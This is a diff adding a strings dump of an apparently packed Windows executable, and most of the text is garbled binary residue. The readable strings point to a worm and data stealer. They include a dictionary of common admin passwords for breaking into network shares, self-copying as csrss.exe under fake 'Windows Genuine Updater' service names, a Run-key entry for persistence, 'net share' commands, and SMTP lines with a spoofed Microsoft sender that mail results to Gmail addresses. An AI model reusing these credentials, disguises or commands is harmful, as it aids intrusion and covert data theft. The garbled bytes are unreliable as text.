@@ -1,0 +1,607 @@
+    
+!This program cannot be run in DOS mode.
+7/Rich
+.text
+`.rdata
+@.data
+.rsrc
+Rh~f
+T$ Qj
+QSUVW
+t$ 3
+_^][Y
+QSUVW
+_^][Y
+dj`j
+jORW
+H\_A^
+UVt(
+IQh4
+IQh4
+=0q@
+IQh4
+IQh4
+IQh4
+IQRU
+IQh4
+IQh4
+_[^]
+= p@
+5 p@
+VWh?
+5 p@
+u1h(
+@Ph(
+5<p@
+=8p@
+-4p@
+D$ph
+-Tp@
+D$,D
+QSSh
+\$df
+QRSSh
+SSSPS
+QRSSh
+SSSPS
+_^][
+-8q@
+D$4h
+L$8SR
+D$4j
+=Dp@
+t#h8
+L$hh$
+T$dj
+D$4j
+SUVWu
+_^][
+WSVV
+WSQV
+-8q@
+D$ SPV
+_^][
+T$ SRV
+_^][
+L$ SQV
+_^][
+D$ SPV
+_^][
+T$ SRV
+_^][
+L$ SQV
+_^][
+D$ SPV
+_^][
+T$ SRV
+_^][
+L$ SQV
+L$@h
+|$,WhL
+L$@WQ
+L$HWQ
+SVWf
+D$&f
+T$tf
+L$8f
+58q@
+D$4R
+L$TP
+T$$QR
+T$xQ
+D$DRP
+L$XPQ
+T$DQ
+D$,RP
+=Xp@
+L$|QS
+=,q@
+5Dp@
+t$$+
+54q@
+54q@
+D$@R
+T$$WRUh
+L$@Q
+D$8f
+Rh~f
+D$0j
+D$ SWPU
+L$Ph
+T$\j
+D$$3
+L$$Q
+Rh~f
+L$LPh
+T$XR
+-Dp@
+_^][
+PQRU
+L$0PWWQW
+=Pq@
+D$$W
+_^][
+_^]3
+=dq@
+/G@;
+<0.u
+.F@Iu
+..F;
+=lp@
+_^]3
+_^]3
+D$$PVSU
+=Pq@
+_^][
+-Pq@
+VWP3
+_^][
+_^][
+l$$t]f
+D$$_^][
+-Tq@
+tYj5f
+D$ t
+=lp@
+%|q@
+%xq@
+%tq@
+%pq@
+%lq@
+%dq@
+%`q@
+%\q@
+%Xq@
+%Tq@
+XSVW
+YYh 
+~XY_
+<"u%
+F<"t
+t9UW
+?=t"U
+QQS3
+PSSW
+8"uD
+8"uF@
+8"u,
+@@f9
+@@f9
+=Hp@
+SS@SSPVSS
+t#SSUP
+t$$VSS
+_^][YY
+HSVWh
+t:jtj
+Yt)V
+u?jtj
+Yt&V
+SVWUj
+]_^[
+t.;t$$t(
+VC20XC00U
+SVWU
+tEVU
+t3x<
+]_^[
+h|t@
+h`t@
+h\t@
+h4t@
+u>Wj
+SVWj
+j@Y3
+Wj@Y3
+t7SW
+    
+@AA;
+t=j	
+Ww!j	
+u+Vj
+j?I_
+u	9}
+ulSj
+uY;]
+pD#U
+j #M
+j?^;
+VWuBh
+tzVS
+GIt%
+t/Ku
+uFWWj
+"WWSh
+9} u
+E WW
+tMWWS
+t@9}
+VSh 
+iphlpapi.dll
+runtime error 
+TLOSS error
+SING error
+DOMAIN error
+R6028
+- unable to initialize heap
+R6027
+- not enough space for lowio initialization
+R6026
+- not enough space for stdio initialization
+R6025
+- pure virtual function call
+R6024
+- not enough space for _onexit/atexit table
+R6019
+- unable to open console device
+R6018
+- unexpected heap error
+R6017
+- unexpected multithread lock error
+R6016
+- not enough space for thread data
+abnormal program termination
+R6009
+- not enough space for environment
+R6008
+- not enough space for arguments
+R6002
+- floating point not loaded
+Microsoft Visual C++ Runtime Library
+Runtime Error!
+Program: 
+<program name unknown>
+GetLastActivePopup
+GetActiveWindow
+MessageBoxA
+user32.dll
+lstrcmpiA
+GetTickCount
+lstrcpynA
+HeapAlloc
+GetProcessHeap
+GetSystemTime
+GetLastError
+lstrlenA
+CreateProcessA
+CloseHandle
+WriteFile
+CreateFileA
+GetSystemDirectoryA
+LockResource
+LoadResource
+FindResourceA
+CopyFileA
+Sleep
+WideCharToMultiByte
+MultiByteToWideChar
+FreeLibrary
+GetProcAddress
+LoadLibraryA
+GetVersion
+GetModuleFileNameA
+TerminateThread
+WaitForSingleObject
+HeapFree
+GetModuleHandleA
+KERNEL32.dll
+wsprintfA
+USER32.dll
+CloseServiceHandle
+CreateServiceA
+OpenSCManagerA
+StartServiceA
+OpenServiceA
+DeleteService
+RegCloseKey
+RegSetValueExA
+RegOpenKeyExA
+GetUserNameA
+ADVAPI32.dll
+WS2_32.dll
+sprintf
+rand
+srand
+_beginthreadex
+_endthreadex
+MSVCRT.dll
+GetStartupInfoA
+GetCommandLineA
+ExitProcess
+TerminateProcess
+GetCurrentProcess
+UnhandledExceptionFilter
+FreeEnvironmentStringsA
+FreeEnvironmentStringsW
+GetEnvironmentStrings
+GetEnvironmentStringsW
+SetHandleCount
+GetStdHandle
+GetFileType
+GetCurrentThreadId
+TlsSetValue
+TlsAlloc
+SetLastError
+TlsGetValue
+HeapDestroy
+HeapCreate
+VirtualFree
+RtlUnwind
+InitializeCriticalSection
+EnterCriticalSection
+LeaveCriticalSection
+GetCPInfo
+GetACP
+GetOEMCP
+VirtualAlloc
+HeapReAlloc
+LCMapStringA
+LCMapStringW
+GetStringTypeA
+GetStringTypeW
+_strupr
+gmail-smtp-in.l.google.com
+johnS203@yahoo.com
+google.com
+whiat1001@gmail.com
+mail1234
+mail123
+mail1
+web1234
+web123
+web1
+mail
+~!@#$%^&*()_+
+!@#$%^&*()
+!@#$%^&*(
+!@#$%^&*
+!@#$%^&
+!@#$%^
+111111
+1111
+4321
+54321
+1234567
+12345
+1234
+asdfgh
+asdfg
+asdf
+BUMBLE
+angel
+passwd
+!@#$
+root
+!@#$%
+admin
+test1234
+pass
+654321
+123456
+password
+db2admin
+administrator
+%d.%d.%d.%d|
+QUIT
+From: "Microsoft" <provider@microsoft.com>
+DATA
+RCPT TO:<
+MAIL FROM:<
+HELO <
+209.85.223.33
+209.85.210.24
+209.85.223.27
+Windows Update
+SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+cmd.exe /c "net share c$ /d"
+cmd.exe /c "net share admin$ /d"
+\lsasvc.exe
+RT_RCDATA
+wgudtr
+Microsoft Windows Genuine Updater
+%SystemRoot%\csrss.exe
+%s\admin$\csrss.exe
+wglmgr
+Windows Genuine Logon Manager
+cmd.exe /c "net share admin$"
+Subject: %s|%s|%s
+%s\ipc$
+%s!@#$
+%s123
+%s12
+@%s@
+@%s!@
+%s!@
+%s%s%s
+ApiBuffe
+AddConne
+CancelCo
+rEnum
+rFree
+ction2A
+nnection2A
+32.dll
+WNet
+WinXp
+Win2003
+Unkown
+WinVista
+WinNt
+Win2000
+Subject: 
+SYSTEM
+gmail.com
+%d.%d.%d.%d
+\\%s
+DnsQuery_A
+dnsapi.dll
+GetNetworkParams
+ERROR!
+Corrupt Data!
+a.Sh
+SRWU
+Y[X[
+ s"j'X+
+QVVPP
+GAKu
+GFJ;
+90u	A
+X97u
+E ;E
+);WQR
+);WQ
+ExitProcess
+LoadLibraryA
+GetProcAddress
+VirtualProtect
+GlobalAlloc
+GlobalFree
+GetModuleHandleA
+MessageBoxA
+wsprintfA
+RegCloseKey
+KERNEL32.dll
+USER32.dll
+ADVAPI32.dll
+WS2_32.dll
+Ct"I
+p/F*
+i`d[
+Te&+
+@=H*p
+|.cgD
+?$~J
+	C?:
+B7q{
+bP+Rs
+-\0S
+;s#[
+_Iz\Ht
+,WL^
+~5jm\h
+!/KMg	
+;d5m
+>.F,a,
+'~M(H
+bVA[
+dT=8
+2%&5"%4
+jR/>6
+51SY
+F3b2O
+A>>4
+ikb*
+Y /q
+</53
+Je08
+:,S:
+|^PG66
+4X7b^
+U?5V}
+"g;~^
+C7D"
+Jm5j
+;@]r
+&	\N
+{k,5+
+<jk7
+k?qJ+}
+CEBG
+8;}_
+*"d0{s
+bQCC
+-:7F
+>AzGw
+Zmbj{9
+X/Jq
+pNAp<
+]U	1L
+]m{Q
+< )6N[
+>I[%j
+ilxBln
+0-baUO
+Pr>D~
+O-hvt^
+N3vB#r
+5Zro
+ieeG
+ixRy
+op9OQ
+nzs!
+d|481
+4_M<
+tj73r
+Z*!6
+Jz*g
+0Kj%6cb
+a-t#D
+k&a9
+P}&L
+b}D]f
+j'j'j;j;j	
+ZD-N
+<{P~
+AjY@
+}Z{R
+XuAy
+7E4%ksB
+!~S5
+?KCR
+[7c$
+wQ]b
+q*W9
+l|Qy
+$8$ND1Q
+B]w$!
+./7ReZ
+09did
+Gv;G]/
+Nj>I
+arr)Z
+QT`aO
+_b1.+
+@=H_
+M-fb
+%zNq
+F5ju
+Si~Wk>
+?bi	r
+L*E6
+GcAS
+DTPV
+?%b+
++/45
+!VH],6
+Z:?#*w
+wwI<i
+6k4	Q
+7j	y
+OQ!OE
+q9U3
+P^0t1K
+tMVMG
+LdE.
+&ZI.
+.?-g
+[8"*~
+n:f.E:
+2N:3
+{&eb=
+"Kk]
+(QIb
+IkK)
+!WB^4
+sF@N
+;(}k
+6u<}y
+k~Xn
+so<T
+q 8y
+xVtV
+1}R'
+ dA$
+@_v+
+!This program cannot be run in DOS mode.
+Rich
+.petite
